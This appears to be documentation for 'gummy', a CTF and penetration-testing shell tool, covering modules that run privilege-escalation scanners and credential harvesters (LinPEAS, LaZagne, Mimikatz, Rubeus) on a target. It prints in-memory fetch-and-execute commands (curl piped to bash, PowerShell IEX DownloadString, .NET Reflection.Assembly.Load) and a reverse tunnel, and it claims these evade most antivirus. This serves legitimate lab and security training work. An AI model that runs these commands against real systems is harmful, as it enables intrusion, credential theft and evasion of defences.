# Modules

Gummy includes a worker-session-based module system for running common CTF tools with a single command. When you launch a module, gummy spawns an invisible worker shell, runs the module there, streams output to a local file, and keeps your main session free for shell interaction.

## Quick Reference

List all available modules:

```
󰗣 gummy [1] ❯ modules
```

Run a module:

```
󰗣 gummy [1] ❯ run <module> [args]
```

## Execution Modes

Each module has an execution mode that determines how it runs on the target:

| Symbol | Mode | Description |
|--------|------|-------------|
| In-memory | `memory` | Script loaded and executed entirely in RAM — zero disk artifacts |
| Disk + cleanup | `disk-cleanup` | Written to disk temporarily, shredded after execution |
| Disk only | `disk-no-cleanup` | Reserved for persistent uploads; not used by the current module set |

## Linux Modules

### LinPEAS — `run peas`

Comprehensive Linux privilege escalation scanner from [PEASS-ng](https://github.com/peass-ng/PEASS-ng).

```
󰗣 gummy [1] ❯ run peas
```

**Mode:** In-memory (`curl | bash` or base64 variable upload)
**Output:** Opens in a new terminal window for easy reading.

### LSE — `run lse`

[Linux Smart Enumeration](https://github.com/diego-treitos/linux-smart-enumeration) with configurable verbosity levels.

```
󰗣 gummy [1] ❯ run lse          # Default: level 1
󰗣 gummy [1] ❯ run lse -l2      # More verbose
```

**Mode:** In-memory
**Default args:** `-l1` (if no args provided)

### Loot — `run loot`

Post-exploitation script that grabs credentials, SSH keys, browser data, and other sensitive files.

```
󰗣 gummy [1] ❯ run loot
```

**Mode:** In-memory

### pspy — `run pspy`

[pspy](https://github.com/DominicBreuker/pspy) — Monitor processes without root privileges. Great for finding cron jobs and other scheduled tasks.

```
󰗣 gummy [1] ❯ run pspy
```

**Mode:** Disk + cleanup (binary uploaded, executed, shredded after)
**Timeout:** 5 minutes by default.
**Note:** Uses pspy64. For 32-bit targets, use `run bin` with the pspy32 URL.

### Linux Exploit Suggester — `run linexp`

Linux privilege-escalation suggestion script.

```
󰗣 gummy [1] ❯ run linexp
```

**Mode:** In-memory

## Windows Modules

### WinPEAS — `run winpeas`

Windows privilege escalation scanner from [PEASS-ng](https://github.com/peass-ng/PEASS-ng). This is a .NET assembly executed entirely in memory.

```
󰗣 gummy [1] ❯ run winpeas
```

**Mode:** In-memory (.NET `Reflection.Assembly.Load`)
**How it works:**

1. `DownloadData()` fetches the .exe as a byte array via HTTP
2. `Reflection.Assembly.Load()` loads it into memory
3. `EntryPoint.Invoke()` executes the Main method
4. Zero files written to disk

### Seatbelt — `run seatbelt`

[Seatbelt](https://github.com/GhostPack/Seatbelt) — Windows system-enumeration assembly executed in memory.

```
󰗣 gummy [1] ❯ run seatbelt
󰗣 gummy [1] ❯ run seatbelt -group=all
```

**Mode:** In-memory (.NET `Reflection.Assembly.Load`)
**Default args:** `-group=all`

### LaZagne — `run lazagne`

[LaZagne](https://github.com/AlessandroZ/LaZagne) — Credential harvester that extracts passwords from browsers, email clients, databases, Wi-Fi, and more.

```
󰗣 gummy [1] ❯ run lazagne          # Default: 'all' modules
󰗣 gummy [1] ❯ run lazagne browsers  # Only browser passwords
```

**Mode:** Disk + cleanup (native binary, not .NET — must touch disk)
**Default args:** `all` (if no args provided)

### Binary — `run bin`

Run any arbitrary binary from a URL or your binbag directory:

```
󰗣 gummy [1] ❯ run bin pspy64              # From binbag
󰗣 gummy [1] ❯ run bin https://url/tool    # From URL
󰗣 gummy [1] ❯ run bin chisel client 10.10.14.5:8888 R:socks
```

**Mode:** Disk + cleanup (downloaded, executed, shredded)

## Custom Modules

These modules run arbitrary scripts/assemblies from URLs or binbag:

### Shell Script — `run sh`

```
󰗣 gummy [1] ❯ run sh https://example.com/script.sh
󰗣 gummy [1] ❯ run sh myscript.sh arg1 arg2    # From binbag
```

**Mode:** In-memory (`curl | bash`)

### PowerShell — `run ps1`

```
󰗣 gummy [1] ❯ run ps1 https://example.com/script.ps1
󰗣 gummy [1] ❯ run ps1 Invoke-Mimikatz.ps1
```

**Mode:** In-memory (`IEX DownloadString`)

### .NET Assembly — `run dotnet`

```
󰗣 gummy [1] ❯ run dotnet SharpUp.exe audit
󰗣 gummy [1] ❯ run dotnet Rubeus.exe kerberoast
󰗣 gummy [1] ❯ run dotnet Seatbelt.exe -group=all
```

**Mode:** In-memory (`DownloadData` + `Reflection.Assembly.Load`)

Works with any .NET assembly that has a `Main()` entry point: SharpUp, Rubeus, Seatbelt, Certify, SharpHound, SharpDPAPI, Whisker, etc.

## Current Validation Status

- Linux: `peas`, `lse`, `loot`, `linexp`, and `pspy` have been tested in the current worker-session model.
- Linux: `sh`, `bin`, and `py` still need fresh validation logs.
- Windows: baseline TUI validation comes before trusting `ps1`, `dotnet`, `winpeas`, `seatbelt`, or `lazagne` in this TUI branch.

### Python — `run py`

```
󰗣 gummy [1] ❯ run py https://example.com/exploit.py
```

**Mode:** In-memory

## How In-Memory Execution Works

### Linux (bash scripts)

With binbag enabled:
```bash
curl -s http://10.10.14.5:8080/linpeas.sh | bash -s -- [args]
```

Without binbag (base64 fallback):
```bash
# Script is uploaded to a bash variable in chunks
gummy_var+="base64chunk1..."
gummy_var+="base64chunk2..."
echo "$gummy_var" | base64 -d | bash -s -- [args]
unset gummy_var
```

### Windows (PowerShell scripts)

With binbag enabled:
```powershell
IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.5:8080/PowerUp.ps1')
```

### Windows (.NET assemblies)

With binbag enabled:
```powershell
$bytes = (New-Object Net.WebClient).DownloadData('http://10.10.14.5:8080/SharpUp.exe')
$assembly = [Reflection.Assembly]::Load($bytes)
$assembly.EntryPoint.Invoke($null, @(,@("audit")))
```

This loads the entire assembly into memory without writing anything to disk — most AV solutions can't detect it.

## Binbag Tips

For the fastest experience, pre-populate your binbag directory with common tools:

```bash
mkdir -p ~/Lab/binbag
cd ~/Lab/binbag

# Linux
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64

# Windows (.NET - in-memory)
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASany.exe

# Windows (PowerShell - in-memory)
wget https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1
wget https://github.com/PowerShellMafia/PowerSploit/raw/refs/heads/master/Recon/PowerView.ps1
```

Then in gummy:

```
set binbag ~/Lab/binbag
```

Modules will automatically use HTTP from your local binbag instead of downloading from the internet each time.
